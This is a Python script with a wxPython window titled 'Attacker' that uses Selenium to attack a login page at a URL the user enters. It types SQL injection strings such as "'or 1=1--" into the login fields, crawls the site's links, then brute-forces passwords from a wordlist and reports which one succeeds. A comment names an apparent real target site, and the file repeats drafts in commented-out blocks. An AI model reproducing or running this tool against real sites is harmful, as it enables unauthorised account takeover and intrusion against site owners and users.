from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import wx
import time
#https://jazzpackages.website/login.php
def getURL(event):
    if fieldusername.Value == "SQLInjection":
        sqlinjections = ["\'or 1=1--", "'-"]
        URL = fieldurl.Value
        options = webdriver.ChromeOptions()
        options.add_argument("--start-maximized")
        driver = webdriver.Chrome("E:\Bilal\Python\chromedriver.exe", options=options)
        driver.get(URL)
        for i in range(0, len(sqlinjections)):
            textfield = driver.find_elements_by_xpath("//input[@type='text' or @type='password']")
            textfield[0].send_keys(sqlinjections[i])
            textfield[1].send_keys(sqlinjections[i])
            time.sleep(1)
            textfield[1].send_keys(Keys.ENTER)
            time.sleep(2)
            driver.get(URL)

    else:
        URL = fieldurl.Value
        list = []
        temp_list = []
        final_link_list = []
        show_link_list = []

        options = webdriver.ChromeOptions()
        options.add_argument("--start-maximized")
        driver = webdriver.Chrome("E:\Bilal\Python\chromedriver.exe", options=options)
        driver.get(URL)

        elems = driver.find_elements_by_xpath("//a[@href]")

        for elem in elems:
            temp_list.append(elem.get_attribute("href"))

        middel_list = []

        for Links in temp_list:
            if 'https:' in Links:
                middel_list.append(Links)

        for num in middel_list:
            if num not in final_link_list:
                final_link_list.append(num)
        time.sleep(2)
        for Links in final_link_list:
            driver.get(Links)
            elems = driver.find_elements_by_xpath("//a[@href]")

            for elem in elems:
                list.append(elem.get_attribute("href"))

        for Links in final_link_list:
            list.append(Links)

        final_link_list = []

        for num in list:
            if num not in final_link_list:
                final_link_list.append(num)
        a = 1

        for Links in final_link_list:
            show_link_list.append("      " + str(a) + "                                       GET" + "                                      " + Links)
            a = int(a)
            a += 1

        for i in show_link_list:
            linksfield.AppendText((i) + "\n")
        linksfield.AppendText("\n")
        # panel2.totallinkspanel.totallinkspanel.SetLabelText("TotalLinks="+str(len(final_link_list)))
        # brute force attack
        filepassword = open(fieldpassword.Value)
        password = []
        for pas in filepassword:
            password.append(pas)
        filepassword.close()
        # removing \n from password
        j = 0
        for i in password:
            password[j] = i.rstrip("\n")
            j += 1

        temp_list = []
        for Links in final_link_list:
            if 'google' in Links:
                a = 0
            elif 'login' in Links:
                temp_list.append(Links)
                break
        if len(temp_list) != 0:
            driver.get(temp_list[0])
            time.sleep(2)

            for i in range(0, len(password)):
                textfield = driver.find_elements_by_xpath("//input[@type='text' or @type='password']")
                textfield[0].clear()
                textfield[1].clear()
                textfield[0].send_keys(fieldusername.Value)
                textfield[1].send_keys(password[i])
                textfield[1].send_keys(Keys.ENTER)
                driver.get(temp_list[0])
                time.sleep(2)
                if temp_list[0] == driver.current_url:
                    linksfield.AppendText("Incorrect Password                         "+password[i]+"\n")
                else:
                    linksfield.AppendText("Correct Password                           " + password[i] + "\n")

    # Fuzzer


app = wx.App(clearSigInt=True)  # clearSigInt to allow terminating the program by CTRL+C
frame = wx.Frame(parent=None, title="Attacker", size=(1000, 539))  ## main window object

panel = wx.Panel(parent=frame, size=(1000, 250))
panel2 = wx.Panel(parent=frame, pos=(0, 250), size=(1000, 250))
panel.SetBackgroundColour("F7F0F0")

labelurl = wx.StaticText(parent=panel, label="URL To Attack", pos=(190, 70))
fieldurl = wx.TextCtrl(parent=panel, pos=(300, 70), size=(420, 20))

labelusername = wx.StaticText(parent=panel, label="Username", pos=(190, 100))
fieldusername = wx.TextCtrl(parent=panel, pos=(300, 100), size=(280, 20))

labelpassword = wx.StaticText(parent=panel, label="Password", pos=(190, 130))
fieldpassword = wx.TextCtrl(parent=panel, pos=(300, 130), size=(280, 20))


attackbutton = wx.Button(parent=panel, label="Attack", pos=(740, 67))
attackbutton.Bind(wx.EVT_BUTTON, getURL)
'''
spiderbox = wx.CheckBox(parent=panel, label="Spider And AJAX Spider", pos=(190, 140))
brutebox = wx.CheckBox(parent=panel, label="Brute Force Attack", pos=(190, 180))
fuzzerbox = wx.CheckBox(parent=panel, label="Fuzzer Attack", pos=(190, 220))
spiderbox.Bind(wx.EVT_CHECKBOX, onChecked)
brutebox.Bind(wx.EVT_CHECKBOX, onChecked)
fuzzerbox.Bind(wx.EVT_CHECKBOX, onChecked)
'''

idpanel = wx.Panel(parent=panel2, pos=(0, 0), size=(100, 20))
idlabel = wx.StaticText(parent=idpanel, label="Id", pos=(40, 0))
idpanel.SetBackgroundColour("white")

methodpanel = wx.Panel(parent=panel2, pos=(100, 0), size=(100, 20))
methodlabel = wx.StaticText(parent=methodpanel, label="Method", pos=(40, 0))
methodpanel.SetBackgroundColour("white")

urlpanel = wx.Panel(parent=panel2, pos=(200, 0), size=(450, 20))
urllabel = wx.StaticText(parent=urlpanel, label="       URL", pos=(40, 0))
urlpanel.SetBackgroundColour("white")

totallinkspanel = wx.Panel(parent=panel2, pos=(650, 0), size=(350, 20))
totallinkslabel = wx.StaticText(parent=totallinkspanel, label="TotalLinks", pos=(40, 0))
totallinkspanel.SetBackgroundColour("white")

linksfield = wx.TextCtrl(parent=panel2, pos=(0, 20), size=(985, 250), style=wx.TE_MULTILINE)


frame.Show()
app.MainLoop()





































'''
list = []
temp_list = []
final_link_list = []
show_link_list = []

driver = webdriver.Chrome("E:\Bilal\Python\chromedriver.exe", options=options)
driver.get(URL)

elems = driver.find_elements_by_xpath("//a[@href]")

for elem in elems:
    temp_list.append(elem.get_attribute("href"))

for num in temp_list:
    if num not in final_link_list:
        final_link_list.append(num)
time.sleep(2)
for Links in final_link_list:
    driver.get(Links)
    elems = driver.find_elements_by_xpath("//a[@href]")

    for elem in elems:
        list.append(elem.get_attribute("href"))

for Links in final_link_list:
    list.append(Links)

final_link_list = []

for num in list:
    if num not in final_link_list:
        final_link_list.append(num)
a = 1

for Links in final_link_list:
    show_link_list.append("      "+str(a)+"                                       GET"+"                                      "+Links)
    a = int(a)
    a+=1

for i in show_link_list:
    print(i)

for i in show_link_list:
    linksfield.AppendText((i)+"\n")
'''

'''
x = 0
temp_list = []
for Links in final_link_list:
    x += 1
    if 'google' in Links:
        a = 0
    elif 'login' or 'sign in' in Links:
        temp_list.append(Links)


print(x)


for Links in temp_list:
    print(Links)
driver.get(temp_list[0])
time.sleep(2)


textfield = driver.find_elements_by_xpath("//input[@type='text' or @type='password']")

for num in textfield:
    num.send_keys("hellow")
'''





'''
from selenium import webdriver
import wx
import time

URL = ""
def getURL(event):
    URL = field.GetValue()
    print(field.GetValue())

app = wx.App(clearSigInt=True)  # clearSigInt to allow terminating the program by CTRL+C
frame = wx.Frame(parent=None, title="Attacker", size=(900, 539))  ## main window object

panel = wx.Panel(parent=frame, size=(900, 250))
panel2 = wx.Panel(parent=frame, pos=(0, 250), size=(900, 250))
panel.SetBackgroundColour("F7F0F0")

label = wx.StaticText(parent=panel, label="URL To Attack", pos=(190, 100))
field = wx.TextCtrl(parent=panel, pos=(300, 100), size=(380, 20))
attackbutton = wx.Button(parent=panel, label="Attack", pos=(700, 97))
attackbutton.Bind(wx.EVT_BUTTON, getURL)

checkbox1 = wx.CheckBox(parent=panel, label="Spider And AJAX Spider", pos=(190, 140))
checkbox2 = wx.CheckBox(parent=panel, label="Brute Force Attack", pos=(190, 180))
checkbox3 = wx.CheckBox(parent=panel, label="Fuzzer Attack", pos=(190, 220))

idpanel = wx.Panel(parent=panel2, pos=(0, 0), size=(100, 20))
idlabel = wx.StaticText(parent=idpanel, label="Id", pos=(40, 0))
idpanel.SetBackgroundColour("white")

methodpanel = wx.Panel(parent=panel2, pos=(100, 0), size=(100, 20))
methodlabel = wx.StaticText(parent=methodpanel, label="Method", pos=(40, 0))
methodpanel.SetBackgroundColour("white")

urlpanel = wx.Panel(parent=panel2, pos=(200, 0), size=(450, 20))
urllabel = wx.StaticText(parent=urlpanel, label="       URL", pos=(40, 0))
urlpanel.SetBackgroundColour("white")

totallinkspanel = wx.Panel(parent=panel2, pos=(650, 0), size=(250, 20))
totallinkslabel = wx.StaticText(parent=totallinkspanel, label="TotalLinks", pos=(40, 0))
totallinkspanel.SetBackgroundColour("white")

linksfield = wx.TextCtrl(parent=panel2, pos=(0, 20), size=(885, 250), style=wx.TE_MULTILINE)

frame.Show()

options = webdriver.ChromeOptions()
options.add_argument("--start-maximized")
app.MainLoop()
'''
'''
x = 0
temp_list = []
for Links in final_link_list:
    x += 1
    if 'google' in Links:
        a = 0
    elif 'login' or 'sign in' in Links:
        temp_list.append(Links)


print(x)


for Links in temp_list:
    print(Links)
driver.get(temp_list[0])
time.sleep(2)


textfield = driver.find_elements_by_xpath("//input[@type='text' or @type='password']")

for num in textfield:
    num.send_keys("hellow")
'''

'''
list = []
temp_list = []
final_link_list = []
show_link_list = []

driver = webdriver.Chrome("E:\Bilal\Python\chromedriver.exe", options=options)
driver.get(URL)

elems = driver.find_elements_by_xpath("//a[@href]")

for elem in elems:
    temp_list.append(elem.get_attribute("href"))

for num in temp_list:
    if num not in final_link_list:
        final_link_list.append(num)
time.sleep(2)
for Links in final_link_list:
    driver.get(Links)
    elems = driver.find_elements_by_xpath("//a[@href]")

    for elem in elems:
        list.append(elem.get_attribute("href"))

for Links in final_link_list:
    list.append(Links)

final_link_list = []

for num in list:
    if num not in final_link_list:
        final_link_list.append(num)
a = 1

for Links in final_link_list:
    show_link_list.append("      "+str(a)+"                                       GET"+"                                      "+Links)
    a = int(a)
    a+=1

for i in show_link_list:
    print(i)

for i in show_link_list:
    linksfield.AppendText((i)+"\n")
'''

'''
x = 0
temp_list = []
for Links in final_link_list:
    x += 1
    if 'google' in Links:
        a = 0
    elif 'login' or 'sign in' in Links:
        temp_list.append(Links)


print(x)


for Links in temp_list:
    print(Links)
driver.get(temp_list[0])
time.sleep(2)


textfield = driver.find_elements_by_xpath("//input[@type='text' or @type='password']")

for num in textfield:
    num.send_keys("hellow")
'''